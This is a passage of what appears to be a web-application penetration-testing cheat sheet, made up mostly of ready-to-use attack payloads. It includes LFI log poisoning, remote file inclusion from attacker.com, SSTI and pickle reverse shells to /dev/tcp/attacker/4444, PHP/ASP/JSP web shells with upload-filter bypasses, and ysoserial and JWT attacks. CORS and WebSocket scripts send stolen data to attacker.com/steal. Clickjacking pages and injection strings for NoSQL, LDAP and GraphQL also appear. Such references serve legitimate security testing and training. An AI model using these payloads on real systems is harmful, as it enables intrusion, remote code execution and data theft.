/proc/version
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/root/.bash_history

# Useful Windows files to read
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\win.ini
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
```
::

### LFI to Remote Code Execution

::code-preview
---
class: "[&>div]:*:my-0"
---
Escalate LFI to code execution.

#code
```
# Log poisoning (Apache)
# Step 1: Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the log file
http://target.com/page?file=../../../var/log/apache2/access.log&cmd=whoami

# Log poisoning (Nginx)
http://target.com/page?file=../../../var/log/nginx/access.log&cmd=id

# Log poisoning (SSH auth log)
ssh '<?php system($_GET["cmd"]); ?>'@target.com
http://target.com/page?file=../../../var/log/auth.log&cmd=whoami

# Log poisoning (Mail log)
# Send email with PHP payload in subject
http://target.com/page?file=../../../var/log/mail.log&cmd=id

# /proc/self/environ
# Inject PHP into User-Agent header, then include
http://target.com/page?file=../../../proc/self/environ

# PHP session files
# Set session variable with PHP code, then include session file
http://target.com/page?file=../../../tmp/sess_<session_id>
http://target.com/page?file=../../../var/lib/php/sessions/sess_<session_id>

# PHP wrappers
# Base64 read source code
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php

# PHP input (POST body execution)
php://input
# POST body: <?php system('whoami'); ?>

# PHP data wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCR7X0dFVFsnY21kJ119KTs/Pg==
# Decodes to: <?php system(${_GET['cmd']}); ?>

# PHP expect wrapper
expect://whoami
expect://id

# PHP zip wrapper
zip://uploads/shell.zip%23shell.php

# PHP phar wrapper
phar://uploads/shell.phar/shell.php
```
::

### Remote File Inclusion (RFI)

::code-preview
---
class: "[&>div]:*:my-0"
---
Include remote files for code execution.

#code
```
# Basic RFI
http://target.com/page?file=http://attacker.com/shell.txt
http://target.com/page?file=http://attacker.com/shell.php

# Null byte bypass
http://target.com/page?file=http://attacker.com/shell.txt%00

# Double encoding
http://target.com/page?file=http%253A%252F%252Fattacker.com%252Fshell.txt

# shell.txt content on attacker server
<?php system($_GET['cmd']); ?>

# Data URI
http://target.com/page?file=data://text/plain,<?php system('whoami'); ?>
http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=

# FTP scheme
http://target.com/page?file=ftp://attacker.com/shell.txt

# SMB share (Windows targets)
http://target.com/page?file=\\attacker.com\share\shell.php
```
::

---

## Directory Traversal

Path traversal allows access to files outside the intended directory.

::code-preview
---
class: "[&>div]:*:my-0"
---
Directory traversal payloads.

#code
```
# Basic traversal
../
..%2f
%2e%2e%2f
%2e%2e/
..%252f
..\/
..\
..%5c
%2e%2e%5c
..%255c

# Deep traversal
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini

# Encoding variations
..%c0%af                          # Overlong UTF-8
..%ef%bc%8f                       # Unicode fullwidth
..%c1%9c                          # Overlong UTF-8 backslash
%252e%252e%252f                   # Double URL encoding
%%32%65%%32%65%%32%66             # Double encoding variant

# Traversal with file extension appended
../../../etc/passwd%00.png        # Null byte (old PHP)
../../../etc/passwd%0a.png        # Newline
../../../etc/passwd....           # Truncation

# Bypassing "must contain" filters
../../../etc/passwd%00images/     # If path must contain "images"
../../../etc/passwd/../images/valid.png

# Absolute path bypass
/etc/passwd
/var/www/html/../../../etc/passwd

# Windows-specific
..\..\..\..\windows\system32\config\sam
..\..\..\..\windows\repair\sam
..\..\..\..\windows\win.ini
..\..\..\..\inetpub\wwwroot\web.config
```
::

---

## Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded into server-side templates, leading to code execution.

### Detection

::code-preview
---
class: "[&>div]:*:my-0"
---
Detect SSTI in various template engines.

#code
```
# Universal detection payloads
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${{7*7}}
{{7*'7'}}

# If 49 is returned → SSTI confirmed
# If 7777777 is returned → Identifies engine type

# Engine identification
{{7*'7'}}
# Jinja2: 7777777
# Twig: 49
```
::

### Jinja2 (Python / Flask)

::code-preview
---
class: "[&>div]:*:my-0"
---
Jinja2 SSTI exploitation.

#code
```python
# Read config
{{ config }}
{{ config.items() }}
{{ settings.SECRET_KEY }}

# Class traversal for command execution
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Find subprocess.Popen index
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if c.__name__ == 'Popen' %}{{ c('id', shell=True, stdout=-1).communicate() }}{% endif %}
{% endfor %}

# Direct RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# Read files
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# Reverse shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read() }}
```
::

### Twig (PHP)

::code-preview
---
class: "[&>div]:*:my-0"
---
Twig SSTI exploitation.

#code
```
# Basic detection
{{7*7}}
{{7*'7'}}

# Read file
{{'/etc/passwd'|file_excerpt(0,100)}}

# Command execution (Twig 1.x)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 3.x
{{['id']|map('system')|join}}
{{['cat /etc/passwd']|map('system')|join}}

# Alternative
{{app.request.server.get('DOCUMENT_ROOT')}}
```
::

### Other Template Engines

::code-preview
---
class: "[&>div]:*:my-0"
---
SSTI payloads for various engines.

#code
```
# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##

# Mako (Python)
<%import os;x=os.popen('id').read()%>${x}
${self.module.cache.util.os.system('id')}

# Pug / Jade (Node.js)
#{7*7}
- var x = root.process.mainModule.require('child_process').execSync('id').toString()
p= x

# ERB (Ruby)
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>

# Handlebars (Node.js)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Smarty (PHP)
{system('id')}
{php}echo `id`;{/php}

# EJS (Node.js)
<%= process.mainModule.require('child_process').execSync('id').toString() %>
```
::

### SSTI Engine Detection Matrix

| Payload          | Jinja2    | Twig   | Freemarker | Mako    | ERB      |
| ---------------- | --------- | ------ | ---------- | ------- | -------- |
| `{{7*7}}`        | `49`      | `49`   | `49`       | `49`    | Error    |
| `{{7*'7'}}`      | `7777777` | `49`   | Error      | Error   | Error    |
| `${7*7}`         | Error     | Error  | `49`       | `49`    | Error    |
| `<%= 7*7 %>`     | Error     | Error  | Error      | Error   | `49`     |
| `#{7*7}`         | Error     | Error  | Error      | Error   | Error    |

---

## Insecure Deserialization

Deserialization of untrusted data can lead to remote code execution.

### Java Deserialization

::code-preview
---
class: "[&>div]:*:my-0"
---
Java deserialization exploitation.

#code
```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 'whoami' > payload.bin
java -jar ysoserial.jar CommonsCollections5 'id' | base64
java -jar ysoserial.jar CommonsCollections7 'curl http://attacker.com/$(whoami)' > payload.bin

# Common gadget chains
CommonsCollections1-7
Spring1-2
Groovy1
JRMPClient
Hibernate1-2
BeanShell1
Jdk7u21
URLDNS                    # DNS-based detection (no RCE)

# Detection
# Look for: rO0AB (Base64 serialized Java)
# Look for: AC ED 00 05 (hex magic bytes)

# Burp Suite extension: Java Deserialization Scanner
# Tool: JexBoss, marshalsec

# URLDNS payload (detection only)
java -jar ysoserial.jar URLDNS "http://attacker.burpcollaborator.net" | base64

# Send via HTTP header/parameter/cookie
Cookie: session=rO0ABXNyABFqYXZhLnV0aWwu...
```
::

### PHP Deserialization

::code-preview
---
class: "[&>div]:*:my-0"
---
PHP deserialization exploitation.

#code
```php
# Detection
# Look for: O:4:"User":2:{s:4:"name";s:5:"admin";...}

# Basic exploitation
# If application has class with __wakeup() or __destruct()
O:14:"DatabaseExport":1:{s:9:"user_file";s:9:"/etc/passwd";}

# POP chain exploitation
# phpggc - PHP Generic Gadget Chains
phpggc Laravel/RCE1 system id
phpggc Monolog/RCE1 system whoami
phpggc Symfony/RCE4 exec 'id'
phpggc WordPress/RCE1 system id

# Phar deserialization
# Generate malicious phar archive
# Access via: phar://uploads/evil.phar
```
::

### Python Deserialization (Pickle)

::code-preview
---
class: "[&>div]:*:my-0"
---
Python pickle deserialization exploitation.

#code
```python
# Generate malicious pickle
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(payload)

# Base64 encoded payload
import base64
print(base64.b64encode(payload).decode())

# Reverse shell via pickle
class ReverseShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"',))

# Detection: Look for base64 encoded pickle or binary pickle data
# Magic bytes: \x80\x04\x95 (Python 3 pickle)
```
::

### .NET Deserialization

::code-preview
---
class: "[&>div]:*:my-0"
---
.NET deserialization exploitation.

#code
```bash
# Generate payload with ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64
ysoserial.exe -f ObjectStateFormatter -g TextFormattingRunProperties -c "cmd /c whoami" -o base64
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe" -o raw
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c id"

# Common vulnerable .NET fields
__VIEWSTATE
__EVENTVALIDATION
Cookie values

# Detection
# Look for: AAEAAAD (base64 BinaryFormatter)
# Look for: /wEy (base64 ViewState)

# ViewState exploitation (without MAC validation)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "whoami" --apppath="/" --path="/default.aspx" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```
::

---

## JWT (JSON Web Token) Attacks

### JWT Structure

::code-preview
---
class: "[&>div]:*:my-0"
---
Understanding JWT structure.

#code
```
# JWT format: Header.Payload.Signature
# Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature

# Decoded Header:
{"alg":"HS256","typ":"JWT"}

# Decoded Payload:
{"user":"admin","role":"admin"}
```
::

### JWT Attack Methods

::code-preview
---
class: "[&>div]:*:my-0"
---
Common JWT exploitation techniques.

#code
```python
# 1. None Algorithm Attack
# Change algorithm to "none" and remove signature
# Header: {"alg":"none","typ":"JWT"}
# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Using jwt_tool
python3 jwt_tool.py <token> -X a

# 2. Algorithm Confusion (RS256 to HS256)
# If server uses RS256, change to HS256 and sign with public key
python3 jwt_tool.py <token> -X k -pk public_key.pem

# 3. Weak Secret Key Brute Force
# Using hashcat
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Using john
john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# 4. JWK Header Injection
# Inject attacker's public key in JWT header
python3 jwt_tool.py <token> -X i

# 5. JKU Header Injection
# Point jku to attacker-controlled JWKS endpoint
python3 jwt_tool.py <token> -X s -ju "http://attacker.com/jwks.json"

# 6. KID Injection
# SQL Injection via kid
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'secret' -- "}
# Sign with 'secret' as the key

# Directory traversal via kid
{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}
# Sign with empty string

# Command injection via kid
{"alg":"HS256","typ":"JWT","kid":"| whoami"}

# 7. Modify claims
python3 jwt_tool.py <token> -T                    # Tamper mode
python3 jwt_tool.py <token> -T -S hs256 -p "secret"  # Re-sign
```
::

### JWT Tool Commands

| Attack                  | Command                                              |
| ----------------------- | ---------------------------------------------------- |
| Decode token            | `jwt_tool <token>`                                   |
| None algorithm          | `jwt_tool <token> -X a`                              |
| Algorithm confusion     | `jwt_tool <token> -X k -pk public.pem`               |
| JWK injection           | `jwt_tool <token> -X i`                              |
| JKU spoofing            | `jwt_tool <token> -X s -ju http://attacker/jwks`     |
| Brute force secret      | `jwt_tool <token> -C -d wordlist.txt`                |
| Tamper claims           | `jwt_tool <token> -T`                                |
| Scan all attacks        | `jwt_tool <token> -M at`                             |

---

## File Upload Vulnerabilities

### Web Shell Upload

::code-preview
---
class: "[&>div]:*:my-0"
---
File upload bypass techniques.

#code
```
# PHP web shells
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?=`$_GET[cmd]`?>
<?php eval($_POST['cmd']); ?>
<? system($_GET['cmd']); ?>

# ASP web shell
<%eval request("cmd")%>
<%execute(request("cmd"))%>

# ASPX web shell
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%= Process.Start(new ProcessStartInfo("cmd","/c " + Request["cmd"]) {UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd() %>

# JSP web shell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Extension bypass techniques
shell.php.jpg
shell.php.png
shell.pHp
shell.php5
shell.php7
shell.phtml
shell.pht
shell.phps
shell.pgif
shell.shtml
shell.php%00.jpg              # Null byte
shell.php%0a.jpg              # Newline
shell.php;.jpg
shell.php.                    # Trailing dot
shell.php%20                  # Trailing space
shell.php....                 # Multiple dots (Windows)
shell.php::$DATA              # NTFS ADS (Windows)

# Content-Type bypass
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Magic bytes bypass (prepend to PHP shell)
GIF89a; <?php system($_GET['cmd']); ?>          # GIF magic bytes
\xFF\xD8\xFF<?php system($_GET['cmd']); ?>      # JPEG magic bytes
\x89\x50\x4E\x47<?php system($_GET['cmd']); ?>  # PNG magic bytes

# Double extension
shell.jpg.php
shell.png.php

# Case sensitivity
shell.pHp
shell.PhP
shell.PHP

# .htaccess upload
# Upload .htaccess to make .jpg files execute as PHP
AddType application/x-httpd-php .jpg

# SVG with embedded script
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

# Polyglot file (valid image + PHP)
# Use exiftool to inject PHP into image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```
::

---

## Insecure Direct Object Reference (IDOR)

::code-preview
---
class: "[&>div]:*:my-0"
---
IDOR exploitation techniques.

#code
```
# Numeric ID manipulation
GET /api/users/1001          # Your profile
GET /api/users/1002          # Another user's profile
GET /api/users/1             # Admin profile

# Sequential enumeration
GET /api/invoices/10001
GET /api/invoices/10002
GET /api/invoices/10003

# UUID/GUID guessing (if predictable)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000

# Parameter manipulation
GET /download?file_id=123
GET /download?file_id=124

POST /api/update-profile
{"user_id": 1001, "email": "new@email.com"}    # Change user_id to target

# HTTP method switching
GET /api/users/1002          # 403 Forbidden
PUT /api/users/1002          # May succeed
PATCH /api/users/1002        # May succeed
DELETE /api/users/1002       # May succeed

# Path traversal IDOR
GET /files/user1/document.pdf
GET /files/user2/document.pdf
GET /files/../admin/secrets.pdf

# Encoded parameter
GET /api/user?id=MTAwMg==    # Base64 of 1002
GET /api/user?id=MQ==        # Base64 of 1 (admin)

# Hashed parameter
GET /api/user?id=c4ca4238a0b923820dcc509a6f75849b  # MD5 of 1
# Try other MD5 hashes

# Wrapped IDOR
POST /api/transfer
{"from_account": "ACC001", "to_account": "ACC002", "amount": 100}
# Change from_account to someone else's

# IDOR in headers/cookies
Cookie: user_id=1001
Cookie: user_id=1002          # Change cookie value

X-User-Id: 1001
X-User-Id: 1002               # Change header value

# Blind IDOR (response doesn't differ)
# Check via email notifications, side effects, or timing
```
::

---

## HTTP Request Smuggling

::code-preview
---
class: "[&>div]:*:my-0"
---
HTTP request smuggling techniques.

#code
```
# CL.TE (Content-Length processed by front-end, Transfer-Encoding by back-end)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (Transfer-Encoding processed by front-end, Content-Length by back-end)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE (Both process TE, but one can be obfuscated)
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-encoding: x
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# TE obfuscation techniques
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked

# Detecting smuggling
# Use Burp Suite's HTTP Request Smuggler extension
# Or smuggler.py tool

# Tools
python3 smuggler.py -u https://target.com
```
::

---

## CORS Misconfiguration

::code-preview
---
class: "[&>div]:*:my-0"
---
Exploit CORS misconfigurations.

#code
```html
<!-- Test for reflected origin -->
<!-- If server reflects Origin header in Access-Control-Allow-Origin -->

<!-- Basic CORS exploitation -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/sensitive-data', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    // Send stolen data to attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: xhr.responseText
    });
  }
};
xhr.send();
</script>

<!-- Fetch-based exploitation -->
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```
::

### CORS Misconfiguration Types

| Misconfiguration                           | Impact                                     |
| ------------------------------------------ | ------------------------------------------ |
| `Access-Control-Allow-Origin: *` + credentials | Data theft (blocked by browsers though) |
| Reflected Origin                           | Full data theft with credentials           |
| Null origin accepted                       | Exploitation via sandboxed iframes         |
| Subdomain wildcard                         | Exploitable via XSS on any subdomain       |
| Pre-flight bypass                          | Access to restricted endpoints             |
| Regex bypass                               | `targetcom.attacker.com` accepted          |

---

## Open Redirect

::code-preview
---
class: "[&>div]:*:my-0"
---
Open redirect payloads.

#code
```
# Basic payloads
https://target.com/redirect?url=https://attacker.com
https://target.com/redirect?url=//attacker.com
https://target.com/redirect?url=\/\/attacker.com
https://target.com/redirect?url=/\attacker.com
https://target.com/redirect?url=https:attacker.com

# Protocol-relative
//attacker.com
\/\/attacker.com

# URL encoding
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2fattacker.com
https://target.com/redirect?url=https%3A%2F%2Fattacker.com

# Double URL encoding
https://target.com/redirect?url=https%253A%252F%252Fattacker.com

# Using @ symbol
https://target.com/redirect?url=https://target.com@attacker.com

# Subdomain confusion
https://target.com/redirect?url=https://attacker.com/target.com
https://target.com/redirect?url=https://target.com.attacker.com

# CRLF injection in redirect
https://target.com/redirect?url=%0d%0aLocation:%20https://attacker.com

# JavaScript URI
https://target.com/redirect?url=javascript:alert(document.domain)

# Data URI
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>

# Common parameter names
?url=
?redirect=
?next=
?return=
?returnTo=
?rurl=
?dest=
?destination=
?redir=
?redirect_uri=
?redirect_url=
?continue=
?forward=
?go=
?target=
?out=
?view=
?to=
?link=
?ref=
```
::

---

## Clickjacking

::code-preview
---
class: "[&>div]:*:my-0"
---
Clickjacking attack templates.

#code
```html
<!-- Basic clickjacking -->
<html>
<head><title>Click to Win!</title></head>
<body>
  <h1>Congratulations! Click the button to claim your prize!</h1>
  <iframe src="https://target.com/settings/delete-account"
    style="position:absolute; top:0; left:0; width:100%; height:100%;
    opacity:0.0001; z-index:2;">
  </iframe>
  <button style="position:relative; z-index:1; margin-top:200px; margin-left:200px;">
    Claim Prize!
  </button>
</body>
</html>

<!-- Drag and drop clickjacking -->
<html>
<body>
  <div id="drag" draggable="true" ondragstart="event.dataTransfer.setData('text/plain','attacker-data')">
    Drag this prize to the box!
  </div>
  <iframe src="https://target.com/settings"
    style="opacity:0.001; position:absolute; top:200px;">
  </iframe>
</body>
</html>

<!-- Multi-step clickjacking -->
<html>
<body>
  <iframe id="frame" src="https://target.com/settings" style="opacity:0.001;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
  <button onclick="step1()" style="position:relative;z-index:2;">Step 1</button>
  <script>
    function step1() {
      document.getElementById('frame').src = 'https://target.com/settings/confirm-delete';
    }
  </script>
</body>
</html>

<!-- Detection: Check for X-Frame-Options and CSP frame-ancestors -->
<!-- Missing X-Frame-Options: DENY/SAMEORIGIN = Vulnerable -->
<!-- Missing Content-Security-Policy: frame-ancestors 'self' = Vulnerable -->
```
::

---

## Host Header Injection

::code-preview
---
class: "[&>div]:*:my-0"
---
Host header injection attacks.

#code
```
# Password reset poisoning
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# Reset link will be sent with attacker.com domain

# Double Host header
POST /forgot-password HTTP/1.1
Host: target.com
Host: attacker.com

# X-Forwarded-Host
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Other headers to try
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Web cache poisoning via Host header
GET / HTTP/1.1
Host: attacker.com
# If cached, all users receive attacker.com content

# Access internal virtual hosts
GET / HTTP/1.1
Host: localhost
Host: internal.target.com
Host: admin.target.com
```
::

---

## NoSQL Injection

::code-preview
---
class: "[&>div]:*:my-0"
---
NoSQL injection payloads.

#code
```
# MongoDB authentication bypass
# JSON body
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}

# URL parameter
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=^admin&password[$ne]=
username=admin&password[$gt]=
username[$in][]=admin&password[$ne]=

# Extract data character by character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

# NoSQL operators
$eq    - Equal
$ne    - Not equal
$gt    - Greater than
$gte   - Greater than or equal
$lt    - Less than
$lte   - Less than or equal
$in    - In array
$nin   - Not in array
$regex - Regular expression
$exists - Field exists
$or    - Logical OR
$and   - Logical AND
$where - JavaScript expression

# JavaScript injection (MongoDB)
{"$where": "this.username == 'admin' && this.password.length > 0"}
{"$where": "function(){return this.username=='admin' && this.password.match(/^a/)}"}

# Server-side JavaScript injection
'; return true; var x='
'; sleep(5000); var x='
```
::

---

## LDAP Injection

::code-preview
---
class: "[&>div]:*:my-0"
---
LDAP injection payloads.

#code
```
# Authentication bypass
*
*)(&
*)(|(&
pwd)
*)(|
*()|%26'
admin)(&)
admin)(!(&(|
*()|&'

# Login bypass
username: admin)(&)
password: anything

username: admin)(|(password=*)
password: anything

username: *)(uid=*))(|(uid=*
password: anything

# Data extraction
*)(uid=*))(|(uid=*
*)(|(mail=*))
*)(|(objectClass=*))

# Blind LDAP injection
admin)(|(password=a*))
admin)(|(password=b*))
admin)(|(password=c*))
# Monitor response differences

# LDAP filter injection
(&(username=admin)(password=*))           # Original
(&(username=admin)(|(&)(password=*)))     # Injected - always true
(&(username=*)(password=*))               # Wildcard - returns all

# Special characters to test
( ) & | ! = > < ~ * / \
```
::

---

## GraphQL Attacks

::code-preview
---
class: "[&>div]:*:my-0"
---
GraphQL exploitation techniques.

#code
```graphql
# Introspection query (discover schema)
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Full introspection
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
}

fragment InputValue on __InputValue {
  name
  type { ...TypeRef }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
  }
}

# Query all users (IDOR/auth bypass)
{
  users {
    id
    username
    email
    password
    role
  }
}

# Query specific user
{
  user(id: 1) {
    username
    email
    password
  }
}

# Mutation - modify data
mutation {
  updateUser(id: 1, role: "admin") {
    id
    username
    role
  }
}

# Batch query (brute force)
{
  user1: user(id: 1) { username password }
  user2: user(id: 2) { username password }
  user3: user(id: 3) { username password }
}

# Denial of Service (nested queries)
{
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}

# SQL injection in GraphQL
{
  user(name: "admin' OR '1'='1") {
    id
    email
  }
}

# Directory listing / field suggestion
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```
::

### GraphQL Tools

| Tool           | Purpose                              |
| -------------- | ------------------------------------ |
| GraphQL Voyager | Visual schema exploration           |
| InQL           | Burp Suite extension for GraphQL     |
| graphw00f      | GraphQL fingerprinting               |
| graphql-cop    | Security audit                       |
| Altair         | GraphQL client                       |
| Clairvoyance   | Schema extraction without introspection |

---

## WebSocket Attacks

::code-preview
---
class: "[&>div]:*:my-0"
---
WebSocket exploitation techniques.

#code
```javascript
// WebSocket hijacking (Cross-Site WebSocket Hijacking)
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send('{"action":"getProfile"}');
};
ws.onmessage = function(event) {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: event.data
  });
};
</script>

// WebSocket SQL injection
ws.send('{"query":"SELECT * FROM users WHERE id=1 OR 1=1"}');
ws.send('{"search":"admin\' OR \'1\'=\'1"}');

// WebSocket XSS
ws.send('{"message":"<img src=x onerror=alert(1)>"}');

// WebSocket command injection
ws.send('{"hostname":"127.0.0.1; whoami"}');

// Enumerate WebSocket endpoints
// Common paths:
/ws
/websocket
/socket
/socket.io
/ws/v1
/ws/v2
/realtime
/graphql-ws

// Tools
// wscat - WebSocket client
wscat -c wss://target.com/ws

// websocat
websocat wss://target.com/ws
```
::

---

## Web Cache Poisoning

::code-preview
---
class: "[&>div]:*:my-0"
---
Web cache poisoning techniques.

#code
```
# Unkeyed header injection
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
# If response includes attacker.com and is cached

# Unkeyed headers to test
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: attacker.com
X-Forwarded-Server: attacker.com

# Cache poisoning with XSS
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# Fat GET request
GET /page?param=value HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=poisoned_value

# Parameter cloaking
GET /page?param=value&utm_content=payload HTTP/1.1
# If utm_content is unkeyed but reflected

# Cache key normalization
GET /page HTTP/1.1           # Cached
GET /PAGE HTTP/1.1           # May bypass cache
GET /page? HTTP/1.1          # May bypass cache
GET /page# HTTP/1.1          # May bypass cache

# Tools
# Param Miner (Burp extension) - Discover unkeyed parameters
# Web Cache Vulnerability Scanner
```
::

---

## Subdomain Takeover

::code-preview
---
class: "[&>div]:*:my-0"
---
Subdomain takeover detection and exploitation.

#code
```bash
# Enumerate subdomains
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o subdomains.txt
assetfinder --subs-only target.com >> subdomains.txt

# Check for CNAME records
dig CNAME sub.target.com
host sub.target.com

# Check for dangling CNAMEs
cat subdomains.txt | while read sub; do
  cname=$(dig +short CNAME $sub)
  if [ ! -z "$cname" ]; then
    echo "$sub -> $cname"
  fi
done

# Tools for detection
subjack -w subdomains.txt -t 100 -timeout 30
nuclei -l subdomains.txt -t takeovers/
can-i-take-over-xyz (reference list)

# Common vulnerable services
# GitHub Pages: Check for 404 on custom domain
# Heroku: "No such app"
# AWS S3: "NoSuchBucket"
# Shopify: "Sorry, this shop is currently unavailable"
# Tumblr: "There's nothing here"
# WordPress.com: "Do you want to register"
# Azure: "404 Web Site not found"
# Fastly: "Fastly error: unknown domain"
# Pantheon: "404 error unknown site"
# Cargo: "404 Not Found"
# Zendesk: "Help Center Closed"
```
::

### Vulnerable Services Reference

